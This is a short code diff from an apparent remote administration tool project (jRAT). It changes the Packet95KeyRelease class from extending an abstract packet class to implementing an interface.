@@ -4,7 +4,7 @@ import jrat.client.Connection;
 import jrat.client.utils.ScreenUtils;
 import jrat.common.utils.Utils;
 
-public class Packet95KeyRelease extends AbstractIncomingPacket {
+public class Packet95KeyRelease implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
